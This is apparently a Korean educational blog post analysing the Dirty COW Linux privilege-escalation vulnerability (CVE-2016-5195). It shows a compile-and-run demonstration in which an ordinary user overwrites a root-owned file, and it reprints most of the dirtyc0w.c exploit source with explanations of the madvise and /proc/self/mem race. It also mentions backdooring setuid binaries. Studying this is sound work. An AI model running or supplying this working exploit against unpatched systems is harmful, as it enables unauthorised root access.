# Explaining Dirty COW local root exploit

#### CVE-2016-5195

7월 3, 2018 willwayy 이정모



일단 2016년도에 나온 취약점인 만큼 이미 패치는 되어있는 상태이다.  하지만 이걸 보여주고 어떻게 작동하는지 연구하고 전반적으로 이 취약점에 대해 이야기 하고자 한다.



백문불여일견 [百聞不如一見] 일단 먼저 설치된 `dirtc0w` 가 먹히는 우분투 시스템에서 실습 먼저 보여주도록 하겠다.

------

#### Ubuntu 14.04

```bash
$ git clone https://github.com/dirtycow/dirtycow.github.io.git
$ cd dirtycow.github.io/
$ ls
CNAME    favicon.ico  index.html  README.md
cow.svg  dirtyc0w.c  pokemon.c
```



##### compile

```bash
$ gcc -pthread dirtyc0w.c -o dirtyc0w
```

> -pthread : 스레드에 대한 컴파일을 구성 할뿐만 아니라 pthread 라이브러리에서 링크하도록 컴파일러에 지시한다.



자 환경은 다 완성했으니, 시나리오를 일단 짜보자.

1. 정상적인 사용자가 쓸 수 없는 루트에 속한 파일을 만든다. (여 문서에서는 foo 라는 이름으로 만들어 볼 것이다)

2. foo 라는 파일은 root 가

    소유하고 있으므로 일반적인 사용자는 w 할 수 없는 상황이다.

3. 이제  `dirtyc0w` 를 실행하여 루트파일을 전달하고 작성하려는 문자열을 지정하면 문자열이 파일에 기록된다..?

해.보.자

------

##### 루트권한 파일 생성 (foo)

```bash
$ sudo -s
[sudo] password for willwayy: 
# echo Can you write it? > foo
# ls
CNAME    dirtyc0w    favicon.ico  index.html  README.md
cow.svg  dirtyc0w.c  foo          pokemon.c
# cat foo
Can you write it?
```

> -r-----r--  1 root     root         18 Jul  3 22:28 foo



##### 일반 사용자가 foo 파일 수정

```bash
$ echo Yes I can! > foo
bash: foo: Permission denied
$ echo Yes I can! >> foo
bash: foo: Permission denied
```

> 당연히 되지 않는다. 일반 사용자니깐!



##### 일반 사용자가 `dirtyc0w` 를 이용해 foo 파일 수정

```bash
$ ./dirtyc0w foo "Yes I can!"
```

> <img src="https://user-images.githubusercontent.com/24206298/42303758-a6d18594-805d-11e8-8dbb-c0a867e091b2.png" style="zoom:150%" />
>
> 일반사용자인데 루트권한의 파일을 수정했다....?   했네 했어..



정말 미친 취약점이다. 이게 만약 `ping` 과 같은 파일 시스템 (`ping ` 도 마찬가지로 root 에 속하며 setuid 설정이 되있다) 같이 누구나 루트권한으로 실행시킬 수 있는 시스템에 backdoor() 를 심어놓는다면 이건 엄청난 문제가 발생하게 되는 것이다..

##### 자 그럼 이제 심각성을 알아봤으니 `dirtyc0w` 의 소스코드를 살펴보자.

------

#### main( )

```c
// 주석 생략
int main(int argc,char *argv[])
{
  if (argc<3) {
  (void)fprintf(stderr, "%s\n",
      "usage: dirtyc0w target_file new_content");
  return 1; }
  pthread_t pth1,pth2;

  f=open(argv[1],O_RDONLY);										// *
  fstat(f,&st);
  name=argv[1];

  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);			// *
  printf("mmap %zx\n\n",(uintptr_t) map);

  pthread_create(&pth1,NULL,madviseThread,argv[1]);				// *
  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);			// *

  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
```

> 1. *`f=open(argv[1],O_RDONLY);*
>    - root 파일을 READ_ONLY로 쓰려는 파일을 연다.
> 2. *map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);*
>    - 가상 메모리에서 물리 메모리로 page-in 된 후 MADV_DONTNEED 플래그로 page-out을 시도하게 되면 'dirtybit' 플래그가 파일이 변경되었음을 나타내고 copy-on-write를 시도하게 된다. copy-on-write를 시작할 때 MAP_PRIVATE 인수를 사용할 경우 다른 프로세스는 파일 변경 여부를 확인할 수 없게 되며, mmap() 호출은 매핑 된 영역에서 확인 가능하다.
> 3. *pthread_create(&pth1,NULL,madviseThread,argv[1]); pthread_create(&pth2,NULL,procselfmemThread,argv[2]);*
>    - 다음으로 병렬로 실행될 2개의 스레드를 실행한다. `dirtyc0w` 는 `Race condition` 취약점으로 특정 이벤트가 특정 순서대로 발생해야한다는 것을 의미한다. 그러니 실패할 시 우연이 아닌 확률에 맞서서 반복해 시도해보면 된다. 그러면 두 스레드가 무엇을 하는지 보자.



#### *madviseThread( )

```c
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
    
  for(i=0;i<100000000;i++)
  {
    c+=madvise(map,100,MADV_DONTNEED);				// *
  }
  printf("madvise %d\n\n",c);
}
```

> 1. *madvise(map,100,MADV_DONTNEED);*
>    - madvise 함수는 메모리를 쓰기 전에 커널에 메모리 공간을 준비해주는 기능을 한다.
>      - 프로그램을 실행하면 하드디스크에 있는 데이터가 메모리에 캐싱되어 동작하게 된다. 왜냐하면 하드디스크 보다 메모리가 빠르기 때문이다. 메모리에 데이터가 캐싱 될 때는 딱 필요한 코드 부분만 캐싱되는 것이 아니라 필요한 코드 앞 뒤 코드도 같이 캐싱 된다. 왜냐하면 다시 실행 될 가능성이 높기 때문에 페이지 단위로 된다. 이것을 페이징이라고 한다.
>      - madvise를 쓰는 이유는 용량이 큰 파일의 경우 madvise 함수를 써서 미리 메모리 공간을 마련해 놓으면 성능이 올라가기 때문이다.
>    - 해당 함수를 통해 100,000,000회를 반복하여 메모리 mapped 상태를 유지하도록 한다.
>    - 그래서 이 코드에서는 madvise() 함수를 통해 메모리의 mmaped 상태를 유지시키며, MADV_DONTNEED 인수를 사용하여 지정된 메모리 주소 범위가 더 이상 필요하지 않음을 커널에게 알린다.
>    - madvise() 함수가 성공적으로 완료됐을 경우 0, 실패할 경우 -1과 error 메시지를 반환한다.



#### *procselfmemThread( )

```c
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;

  int f=open("/proc/self/mem",O_RDWR);				// *
  int i,c=0;
  for(i=0;i<100000000;i++) {

    lseek(f,(uintptr_t) map,SEEK_SET);				// *
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}
```

> `Race condition` 을 시도하기 위해 사용되는 함수이며 madviseThread()함수와 동일한 횟수로 반복문 사용한다.
>
> 1. *int f=open("/proc/self/mem",O_RDWR);*
>    - "/proc/self/mem"은 가상 메모리를 보여주는 바이너리 파일인데 해당 파일을 O_RDWR(읽기와 쓰기 모두 가능) 모드로 연다.
> 2. *lseek(f,(uintptr_t) map,SEEK_SET);*
>    - 파일내용을 변조하기 위해 lseek() 함수를 사용하여 파일 포인터 위치를 매핑되어 있는 메모리 주소로 이동시킨다. 그리고 포인터가 이동된 뒤 write() 함수를 사용하여 가상 메모리 바이너리 파일 내용 변경을 시도한다.



------

그림으로 쉽게 설명하자면, 



#### 정상적인 로직

<img src="https://user-images.githubusercontent.com/24206298/42303760-ac5529ee-805d-11e8-9e93-f95d36e22cea.png" style="zoom:00%" />

> 정상적으로 프로세스가 순차적으로 실행될 경우 위와 같이 자원을 복사하여 사용하고 해제해 문제가 발행하지 않는다.

#### dirtyc0w 가 발생하는 로직

<img src="https://user-images.githubusercontent.com/24206298/42303759-ac161a56-805d-11e8-9bde-8914881381b7.png" style="zoom:85%" />

> 하지만 Thread 1 이 가피본을 만들기 전, 카피본의 자원을 해제하는 Thread 2 가 먼저 실행될 경우 원본과 카피본을 혼동하여 위의 그림과 같은 문제가 발생되는 것이다. (ping 은 setuid 비트가 설정되어 있어 root 권한으로 실행되기 때문에 쉘도 root 권한으로 생성되는것..)

